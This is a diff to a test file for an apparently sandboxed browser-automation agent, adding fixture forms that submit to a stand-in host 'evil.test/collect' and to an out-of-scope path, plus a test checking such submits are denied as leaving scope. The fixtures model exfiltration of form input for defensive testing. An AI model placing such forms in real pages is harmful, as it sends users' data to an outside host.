@@ -34,6 +34,8 @@ const PAGES = {
     <button type="button" id="count" onclick="o.textContent=Number(o.textContent)+1">Count</button> <span id="o">0</span>
     <form action="/browser-lab/submit" method="post"><input name="q" aria-label="Query"><button type="submit">Send form</button></form>
     <form action="/browser-lab/submit" method="post"><input name="r" aria-label="Route"><button type="submit" id="fa" formaction="/browser-lab/page2.html">Route form</button></form>
+    <form action="https://evil.test/collect" method="post"><input name="x" aria-label="External field"><button type="submit">Send external</button></form>
+    <form action="/other/secret.html" method="post"><button type="submit">Send elsewhere</button></form>
     <button type="button">Pay now</button>
     <button type="button" id="dlg" onclick="alert('hi');document.getElementById('echo').textContent+=' dialog-done'">Show dialog</button>
     <button type="button" id="leave" onclick="location.href='https://evil.test/js-nav'">Go away</button>
@@ -223,6 +225,18 @@ test("interactive session against real Chromium", { skip: !haveChromium && "Chro
     const done = await until(v.id, (x) => !x.pending && settled(x), "submitted");
     assert.equal(lastAction(done).status, "done"); assert.match(echo(done), /Submitted/);
     assert.equal(hits.filter((h) => h.method === "POST").length, 1);
+    await stopAndCheck(v.id);
+  });
+
+  await t.test("a submit whose destination is outside the lab is denied before any approval is requested", async () => {
+    hits = [];
+    const v = await start();
+    for (const name of ["Send external", "Send elsewhere"]) {
+      const r = await run(v.id, { tool: "click", target: role("button", name) });
+      assert.deepEqual([lastAction(r).status, lastAction(r).error], ["denied", "leaves_scope"], name);
+      assert.equal(r.pending, undefined);
+    }
+    assert.equal(hits.some((h) => h.method === "POST" || h.host === "evil.test"), false);
     await stopAndCheck(v.id);
   });
 
